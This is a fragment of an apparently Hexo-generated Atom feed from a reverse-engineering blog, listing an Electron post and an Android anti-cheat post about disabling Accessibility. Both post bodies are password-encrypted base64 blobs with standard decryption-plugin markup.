gMT5YLRtxqYY3MarX8HPssRbQIJBgQQmb6tcvakUCsVcTUs6pjunV6UtYINxwsNAw0k7c4yqpUGCLgQP7YjyRpCiHk64IgGRUWzhsnoV0K4FyHKuvHyxsxe78eTuRFcd8wzY7EeGyvp6s8pVsxdF9WVyix8zYS40Fh2g3Ly3d4zv1OiM0bZr2t7sT5G0mWk77F6+ssc90PXodjSbHkEwkgIQI+9D+En62UOia1UparNkfQa96T1FLTaxmxfj/ZLyx2w2eE3WXpQscZbNmSxCb/FMhOl1BExvn71dRYlHU6AV/y1aGnd688+5HNzgGiUM9PBaGOCEFhhrPDBXlXcpQ9PvsyxRWs4ekqzjOU2q3UC3cX7CQ0i/4f5D7np8zDTwOM+iyp7/0I56wjd8gesE7VR9spJuPxVTamFLEY2LbndwQ000EgB/+VYyPEhCug58L9XJxeB1K6hkgHmtpQEgLqOYnRssm7si43SzG2qf7IDLO4NRSTrHRyXZiHixXttFO2/DbrECXbL8bXJxtmSxRYGrpqU4RO66SQjRsAk8vvUuJbGiHLXbPDaz/83erG98Idh7O22BkZfz1XBtkzwAlqckQFrBke4o3dZu+5rzlSTyaltN40qPX1kyF8WYTMMH1NhcREIPIYEYEveHWJr8OsPPMzsVv9Ab5drAveTS5XjsHfw1lz9SSw2lNG//Gh8+4j3mnLKDrM4wSQV72bXFwUOr8GrysX0K4YXpDaOZaHakfOm9/NJj/UeYAC61LWV4g9S1Xmmz2LWWI6j9KLW+EshUFIIXTw9XVvtlx7qangLVlTyihZsPp8pmt/SvXxkgik3LaZgNCGd9JhCn0BFzxrflx8mNF8ekz6Q6PzqZw4g+2SnLJBJ7h9lAVAO3yyaz8mwhg1mzbqt6xCwx8o8pfcs/16AgaBp1vuw26LenxB5M61yZmif6lwHjEPZDsWiJ111rWqxcJF2tR/Y3tn8Ox64Usg8IiiVR9/GsJzc</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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